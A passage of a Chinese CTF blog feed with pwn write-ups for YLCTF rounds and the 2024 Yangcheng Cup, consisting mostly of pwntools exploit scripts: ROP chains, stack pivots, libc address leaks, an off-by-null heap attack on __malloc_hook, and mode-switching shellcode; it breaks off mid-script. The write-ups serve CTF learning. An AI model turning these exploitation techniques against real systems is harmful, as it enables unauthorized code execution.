class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> isprint(p32(addr)[<span class="hljs-number">1</span>]) <span class="hljs-keyword">and</span> isprint(p32(addr)[<span class="hljs-number">2</span>]) <span class="hljs-keyword">and</span> isprint(p32(addr)[<span class="hljs-number">3</span>])):<br>        p.close()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><br>shellcode_x86 = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,<span class="hljs-subst">&#123;addr+<span class="hljs-number">0x100</span>&#125;</span></span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_flag = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push <span class="hljs-subst">&#123;addr+<span class="hljs-number">0x49</span>&#125;</span></span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">mov rdi,rcx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,0x70</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_read = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*read(0,addr,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push <span class="hljs-subst">&#123;addr&#125;</span> /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x26],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x27],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>append = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/* 52 5a */</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_retfq = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x4d],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x4d],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x4e],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x4e],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push <span class="hljs-subst">&#123;addr&#125;</span></span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_x86 = asm(shellcode_x86, arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br>shellcode_flag = asm(shellcode_flag, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = shellcode_read + append<br>shellcode += shellcode_retfq + append<br>shellcode = asm(shellcode,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;botmsg: &#x27;</span>)<br><br>gen = ctypes.CDLL(<span class="hljs-string">&quot;./gen.so&quot;</span>).gen<br>gen.restype = ctypes.c_char_p<br>payload = gen(shellcode)<br><br><span class="hljs-comment"># gdb.attach(p,gdbscript=&quot;b *$rebase(0x17c9)&quot;)</span><br><br>p.send(payload)<br>sleep(<span class="hljs-number">3</span>)<br>p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">b&#x27;\x90&#x27;</span> + shellcode_flag)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Round2"><a href="#Round2" class="headerlink" title="Round2"></a>Round2</h2><h3 id="ezstack2"><a href="#ezstack2" class="headerlink" title="ezstack2"></a>ezstack2</h3><p>程序中有个后门，控制一下参数再调用后门函数就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = gdb.debug(&quot;./pwn&quot;)</span><br><br>vuln = <span class="hljs-number">0x0000000000400757</span><br>pop_rdi = <span class="hljs-number">0x0000000000400823</span> <span class="hljs-comment"># pop rdi ; ret</span><br>ret = <span class="hljs-number">0x000000000040056e</span> <span class="hljs-comment"># ret</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">48</span>+<span class="hljs-number">8</span>) +  p64(pop_rdi) + p64(<span class="hljs-number">1131796</span>) + p64(ret) + p64(vuln)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shortshell"><a href="#shortshell" class="headerlink" title="shortshell"></a>shortshell</h3><p>用5个字节的shellcode跳到后门处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;nop\n&#x27;</span>*<span class="hljs-number">0x1270</span><br>shellcode += <span class="hljs-string">&#x27;a:\n&#x27;</span><br>shellcode += <span class="hljs-string">&#x27;nop\n&#x27;</span>*(<span class="hljs-number">0x4069</span>-<span class="hljs-number">0x1270</span>)<br>shellcode += <span class="hljs-string">&#x27;jmp a&#x27;</span><br><br>payload = asm(shellcode,vma=<span class="hljs-number">0x400000</span>)[-<span class="hljs-number">5</span>:]<br><br>p.recvuntil(<span class="hljs-string">b&#x27;YLCTF-PWN\n&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="magicread"><a href="#magicread" class="headerlink" title="magicread"></a>magicread</h3><p>简单的栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x0000000000400723</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi = <span class="hljs-number">0x0000000000400721</span> <span class="hljs-comment"># pop rsi ; pop r15 ; ret</span><br><br>read = <span class="hljs-number">0x400675</span><br>addr = <span class="hljs-number">0x601500</span><br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(addr) + p64(read)<br>p.recvuntil(<span class="hljs-string">b&#x27;read!\n&#x27;</span>)<br>p.send(payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(addr+<span class="hljs-number">0x48</span>) + p64(read)<br>p.send(payload2)<br><br>payload3 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read)<br>payload3 = payload3.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload3 += p64(addr+<span class="hljs-number">0x30</span>) + p64(read)<br>p.send(payload3)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>payload4 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + p64(libc_base + <span class="hljs-number">0x4527a</span>)<br>p.send(payload4)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Round3"><a href="#Round3" class="headerlink" title="Round3"></a>Round3</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>签到题，随便逆逆拿到密码<br>然后nc上去输密码就有flag</p><h3 id="ezstack3"><a href="#ezstack3" class="headerlink" title="ezstack3"></a>ezstack3</h3><p>第一次输入泄露一下栈地址<br>第二次输入进行栈迁移，并且同时返回到输入的位置再次输入<br>第三次劫持read的返回地址，并且利用栈构造<code>/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">42243</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>read = <span class="hljs-number">0x0804930A</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">52</span> + <span class="hljs-string">b&#x27;bbbb&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&#x27;stack3&#x27;</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>ebp = u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">28</span><br>log.success(<span class="hljs-string">&quot;ebp --&gt;&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(ebp))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">48</span><br>payload += p32(ebp+<span class="hljs-number">4</span>)<br>payload += p32(read)<br>p.recvuntil(<span class="hljs-string">b&#x27;pwn!&#x27;</span>)<br>p.send(payload)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload = p32(<span class="hljs-number">0</span>) + p32(system_plt) + p32(<span class="hljs-number">0</span>) + p32(ebp)<br>payload = payload.ljust(<span class="hljs-number">44</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>glibc-2.27的堆题<br>edit函数有个off by null<br>create函数限制堆的大小不能大于0x100</p><p>泄露libc_base然后打malloc_hook即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">37666</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;Size &quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;Content: &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_addr-<span class="hljs-number">0x3ebdb0</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x70</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">21</span>):<br>    add(i,<span class="hljs-number">0xf8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">17</span>)<br>edit(<span class="hljs-number">18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0x200</span>))<br>delete(<span class="hljs-number">19</span>)<br><br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">22</span>,<span class="hljs-number">0x100</span>)<br>delete(<span class="hljs-number">22</span>)<br><br>edit(<span class="hljs-number">18</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>)+p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]))<br>add(<span class="hljs-number">23</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">24</span>,<span class="hljs-number">0x100</span>)<br><br>ones = [<br><span class="hljs-number">0x4f29e</span>,<br><span class="hljs-number">0x4f2a5</span>,<br><span class="hljs-number">0x4f302</span>,<br><span class="hljs-number">0x10a2fc</span>,<br>]<br><br>one = ones[<span class="hljs-number">3</span>]<br><br>edit(<span class="hljs-number">24</span>,p64(libc_base+one))<br>add(<span class="hljs-number">25</span>,<span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ycb2024</title>
      <link href="/2024/11/05/ycb2024/"/>
      <url>/2024/11/05/ycb2024/</url>
      
        <content type="html"><![CDATA[<p>羊城杯 2024</p><span id="more"></span><blockquote><p>2024羊城杯pwn wp</p></blockquote><h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><p>常规的栈迁移题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>local32_libc = <span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span><br>local64_libc = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>remote_libc = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br>libc = ELF(remote_libc)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;139.155.126.78&quot;,33672)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>vuln = <span class="hljs-number">0x4006B0</span><br>leave_ret = <span class="hljs-number">0x4006DB</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400773</span> <span class="hljs-comment"># pop rdi ; ret</span><br>read = <span class="hljs-number">0x4006C4</span><br>call_read = <span class="hljs-number">0x4006D5</span><br>ret = <span class="hljs-number">0x4006DC</span><br><br>rbp = <span class="hljs-number">0x601500</span><br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span> + p64(rbp) + p64(read)<br>p.send(payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span> + p64(rbp+<span class="hljs-number">0x30</span>) + p64(read)<br>p.send(payload2)<br><br>payload3 = p64(rbp+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x10</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>p.send(payload3)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;overflow?\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\0&quot;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload4 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>+p64(rbp+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x20</span>)+p64(read)<br>p.send(payload4)<br><br><span class="hljs-comment">#0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br>one_gadget = libc_base + <span class="hljs-number">0xebc88</span><br><br>pop_rdx = libc_base + <span class="hljs-number">0x000000000011f2e7</span> <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span> <span class="hljs-comment"># pop rsi ; ret</span><br><br>payload5 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdx) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(one_gadget)<br><span class="hljs-comment">#payload5 = p64(0) + p64(ret) + p64(pop_rdi)+p64(binsh)+p64(system_addr)</span><br><br>p.send(payload5)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h1><p>这题应该是我第一次打IO_FILE<br>之前都不怎么会打2.35之后的堆题，现在学会IO_FILE后总算是会打了</p><p>我们打IO_FILE的目的是劫持程序的执行流，具体来说就是call任意一个地址<br>然后通过一些”mov|call”的gadget把栈迁到堆上，并布置mprotect的ROP链，修改堆的执行权限<br>并ret到修改完执行权限的shellcode部分，从而执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 